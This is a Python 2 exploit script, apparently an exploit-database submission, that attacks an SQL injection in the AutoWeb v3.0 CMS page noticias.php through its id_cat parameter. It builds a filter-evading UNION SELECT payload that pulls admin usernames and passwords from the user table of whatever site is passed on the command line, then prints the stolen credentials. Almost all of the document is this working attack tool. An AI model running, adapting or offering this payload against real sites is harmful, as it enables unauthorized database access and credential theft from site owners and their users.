#!/usr/bin/env python
#-*- coding:utf-8 -*-
  
# Title        : AutoWeb v3.0 (noticias.php id_cat) SQL Injection Exploit
# Author       : ZoRLu / zorlu@milw00rm.com / submit@milw00rm.com
# Home         : http://milw00rm.com / its online
# Download     : http://www.multdivision.com.br
# Demo         : http://www.cbnmogi.com.br
# Other Vuln.  : http://www.1337day.com/exploit/22697 / thks: Felipe Andrian Peixoto
# date         : 28/09/2014
# Python       : V 2.7
# Thks         : exploit-db.com, packetstormsecurity.com, securityfocus.com, sebug.net and others
    
import sys, urllib2, re, os, time
   
if len(sys.argv) < 2:
    os.system(['clear','cls'][1])
    print " ____________________________________________________________________"
    print "|                                                                    |"
    print "|   AutoWeb v3.0 (noticias.php id_cat) SQL Injection Exploit         |"
    print "|   ZoRLu / milw00rm.com                                             |"
    print "|   exploit.py http://site.com/path/                                 |"
    print "|____________________________________________________________________|"
    sys.exit(1)
  
koybasina = "http://"
koykicina = "/"
sitemiz = sys.argv[1]

if sitemiz[-1:] != koykicina:
    sitemiz += koykicina
      
if sitemiz[:7]  != koybasina:
    sitemiz =  koybasina + sitemiz
  
vulnfile = "noticias.php"
sql = "?id_cat=0x90+/*!12345union*/+/*!12345select*/+1,concat(0x3a3a3a,username,0x3a3a3a),concat(0x3b3b3b,senha,0x3b3b3b),4,5,6,7,8,9,10+/*!12345from*/+/*!12345user*/--"
url = sitemiz + vulnfile + sql
  
print "\nExploiting...\n"
 
try:
    veri = urllib2.urlopen(url).read()
    aliver = re.findall(r":::(.*)([0-9a-fA-F])(.*):::", veri)
    if len(aliver) > 0:
        print "username:  " + aliver[0][0] + aliver[0][1] +aliver[0][2]
    else:
        print "Exploit failed..."
         
 
except urllib2.HTTPError:
    print "Security!"

  
try:
    veri = urllib2.urlopen(url).read()
    aliver = re.findall(r";;;(.*)([0-9a-fA-F])(.*);;;", veri)
    if len(aliver) > 0:
        print "password:  " + aliver[0][0] + aliver[0][1] +aliver[0][2]
                 
        print "\nGood Job Bro!"
    else:
        print "Exploit failed..."
         
 
except urllib2.HTTPError:
    print "Security!"
